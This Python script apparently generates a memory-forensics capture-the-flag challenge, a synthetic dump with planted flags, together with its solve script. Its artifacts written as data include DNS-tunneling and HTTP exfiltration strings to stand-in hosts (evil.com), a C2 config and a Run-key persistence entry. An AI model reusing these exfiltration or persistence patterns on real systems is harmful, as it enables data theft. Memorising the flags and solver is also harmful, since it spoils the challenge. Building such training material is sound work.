#!/usr/bin/env python3

import os
import struct
import hashlib
import random
import json
import base64
from pathlib import Path

class MemoryDumpGenerator:
    def __init__(self):
        self.memory = bytearray(1024 * 1024 * 50)
        self.processes = []
        self.network_connections = []
        self.offset = 0x10000
        
    def write_at(self, offset, data):
        self.memory[offset:offset+len(data)] = data
        return offset
    
    def add_process(self, pid, name, ppid, image_base, threads):
        self.processes.append({
            'pid': pid,
            'name': name,
            'ppid': ppid,
            'image_base': image_base,
            'threads': threads
        })
    
    def add_network_connection(self, src_ip, src_port, dst_ip, dst_port, pid, state):
        self.network_connections.append({
            'src': f"{src_ip}:{src_port}",
            'dst': f"{dst_ip}:{dst_port}",
            'pid': pid,
            'state': state
        })
    
    def create_flag_artifacts(self):
        flag = "flag{v0l4t1l1ty_m4st3r_4dv4nc3d_f0r3ns1cs}"
        
        offset1 = 0x100000
        self.write_at(offset1, b"SECRET_KEY=" + flag.encode())
        
        offset2 = 0x200000
        key = 0x42
        encrypted = bytes([b ^ key for b in flag.encode()])
        self.write_at(offset2, b"EncryptedData=" + encrypted)
        
        offset3 = 0x300000
        encoded = base64.b64encode(flag.encode())
        http_request = f"GET /api/data?q={encoded.decode()} HTTP/1.1\r\nHost: ctf.example.com\r\n\r\n".encode()
        self.write_at(offset3, http_request)
        
        offset4 = 0x400000
        creds = f"user:admin\npass:{flag}\nhost:192.168.1.100".encode()
        self.write_at(offset4, creds)
        
        offset5 = 0x500000
        shellcode = bytearray()
        for i, c in enumerate(flag.encode()):
            shellcode.extend([c ^ (i & 0xFF), 0x90, 0x90])
        self.write_at(offset5, bytes(shellcode))
        
        return {
            'process': hex(offset1),
            'registry': hex(offset2),
            'network': hex(offset3),
            'credentials': hex(offset4),
            'shellcode': hex(offset5)
        }
    
    def create_process_hollowing(self):
        legitimate_pid = 1024
        self.add_process(legitimate_pid, "svchost.exe", 600, 0x7ff00000, 15)
        
        offset = 0x7ff10000
        shellcode = (
            b"\x48\x89\xe5"
            b"\x48\x83\xec\x20"
            b"\x48\x31\xc0"
            b"\x48\x89\xc7"
            b"\x48\x8d\x35\x00\x00\x00\x00"
        )
        self.write_at(offset, shellcode)
        
        flag_utf16 = "flag{process_hollowing_detected}".encode('utf-16-le')
        self.write_at(offset + 0x1000, flag_utf16)
        
        return legitimate_pid
    
    def create_anti_forensics(self):
        timestamps = {
            0x600000: "2025-01-15 10:30:00",
            0x600010: "2024-01-01 00:00:00",
        }
        for offset, ts in timestamps.items():
            self.write_at(offset, ts.encode())
        
        real_name = "malware.exe"
        fake_name = "svchost.exe"
        self.write_at(0x700000, real_name.encode())
        self.write_at(0x700010, fake_name.encode())
        
        ads_path = "C:\\Windows\\System32\\config\\SAM:hidden_flag"
        hidden_flag = "flag{alternate_data_stream_found}"
        self.write_at(0x800000, ads_path.encode() + b"\x00" + hidden_flag.encode())
    
    def create_network_artifacts(self):
        self.add_network_connection("192.168.1.100", 49152, "142.250.80.46", 443, 1024, "ESTABLISHED")
        self.add_network_connection("192.168.1.100", 49153, "151.101.1.69", 443, 2048, "ESTABLISHED")
        self.add_network_connection("192.168.1.100", 49154, "185.220.101.45", 8443, 3072, "ESTABLISHED")
        
        dns_query = "flag{dns_tunneling_exfiltration}.data.evil.com"
        self.write_at(0x900000, dns_query.encode())
        
        http_exfil = (
            "POST /upload HTTP/1.1\r\n"
            "Host: c2.evil.com\r\n"
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "flag{data_exfiltrated_via_http}"
        ).encode()
        self.write_at(0x910000, http_exfil)
    
    def create_registry_artifacts(self):
        reg_key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_value = "C:\\Users\\admin\\AppData\\Local\\Temp\\update.exe"
        self.write_at(0xA00000, f"{reg_key}\\WindowsUpdate = {reg_value}".encode())
        
        config = json.dumps({
            "c2_server": "185.220.101.45",
            "port": 8443,
            "key": "flag{registry_persistence_detected}",
            "sleep_time": 300
        })
        self.write_at(0xA10000, config.encode())
    
    def generate(self, output_file="memory_dump.raw"):
        print("[*] Generating memory dump...")
        
        print("[*] Creating flag artifacts...")
        flag_offsets = self.create_flag_artifacts()
        
        print("[*] Creating process hollowing...")
        hollowed_pid = self.create_process_hollowing()
        
        print("[*] Creating anti-forensics artifacts...")
        self.create_anti_forensics()
        
        print("[*] Creating network artifacts...")
        self.create_network_artifacts()
        
        print("[*] Creating registry artifacts...")
        self.create_registry_artifacts()
        
        self.add_process(4, "System", 0, 0x00400000, 150)
        self.add_process(100, "csrss.exe", 4, 0x7ff600000000, 8)
        self.add_process(600, "services.exe", 4, 0x7ff610000000, 12)
        self.add_process(2048, "explorer.exe", 100, 0x7ff620000000, 50)
        self.add_process(3072, "chrome.exe", 2048, 0x7ff630000000, 20)
        
        print("[*] Adding noise...")
        for i in range(1000):
            noise_offset = random.randint(0x1000000, len(self.memory) - 100)
            noise = os.urandom(random.randint(10, 100))
            self.write_at(noise_offset, noise)
        
        print(f"[*] Writing dump to {output_file}...")
        with open(output_file, 'wb') as f:
            f.write(self.memory)
        
        metadata = {
            'flags': flag_offsets,
            'processes': self.processes,
            'network': self.network_connections,
            'size_mb': 50
        }
        
        with open('metadata.json', 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"[+] Dump generated: {output_file} ({os.path.getsize(output_file)} bytes)")
        print(f"[+] Metadata: metadata.json")
        
        return metadata

def create_solve_script():
    solve_code = '''#!/usr/bin/env python3

import re
import base64
from pathlib import Path

def xor_decrypt(data, key):
    return bytes([b ^ key for b in data])

def solve():
    dump_file = "memory_dump.raw"
    
    if not Path(dump_file).exists():
        print(f"[!] {dump_file} not found!")
        return
    
    print("[*] Loading memory dump...")
    with open(dump_file, 'rb') as f:
        memory = f.read()
    
    print(f"[*] Dump size: {len(memory)} bytes ({len(memory) // (1024*1024)} MB)")
    
    flags_found = []
    
    flag_pattern = rb'flag\\{[^}]+\\}'
    plaintext_flags = re.findall(flag_pattern, memory)
    for f in plaintext_flags:
        try:
            decoded = f.decode()
            if decoded not in flags_found:
                flags_found.append(decoded)
                print(f"[+] Found: {decoded}")
        except:
            pass
    
    target = b"flag{"
    for key in range(256):
        encrypted = bytes([b ^ key for b in target])
        pos = memory.find(encrypted)
        if pos != -1:
            chunk = memory[pos:pos+100]
            decrypted = xor_decrypt(chunk, key)
            flag_match = re.search(rb'flag\\{[^}]+\\}', decrypted)
            if flag_match:
                flag = flag_match.group().decode()
                if flag not in flags_found:
                    flags_found.append(flag)
                    print(f"[+] Found (XOR key=0x{key:02x}): {flag}")
    
    b64_pattern = rb'[A-Za-z0-9+/]{20,}={0,2}'
    for match in re.finditer(b64_pattern, memory):
        try:
            decoded = base64.b64decode(match.group())
            flag_match = re.search(rb'flag\\{[^}]+\\}', decoded)
            if flag_match:
                flag = flag_match.group().decode()
                if flag not in flags_found:
                    flags_found.append(flag)
                    print(f"[+] Found (Base64): {flag}")
        except:
            pass
    
    utf16_pattern = rb'(?:f\\x00l\\x00a\\x00g\\x00\\{\\x00)'
    for match in re.finditer(utf16_pattern, memory):
        start = match.start()
        chunk = memory[start:start+200]
        try:
            decoded = chunk.decode('utf-16-le', errors='ignore')
            flag_match = re.search(r'flag\\{[^}]+\\}', decoded)
            if flag_match:
                flag = flag_match.group()
                if flag not in flags_found:
                    flags_found.append(flag)
                    print(f"[+] Found (UTF-16): {flag}")
        except:
            pass
    
    print("\\n" + "=" * 60)
    print(f"[*] Total flags found: {len(flags_found)}")
    for i, flag in enumerate(flags_found, 1):
        print(f"  {i}. {flag}")
    
    return flags_found

if __name__ == '__main__':
    solve()
'''
    
    with open('solve.py', 'w') as f:
        f.write(solve_code)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'solve':
        create_solve_script()
    else:
        generator = MemoryDumpGenerator()
        generator.generate()
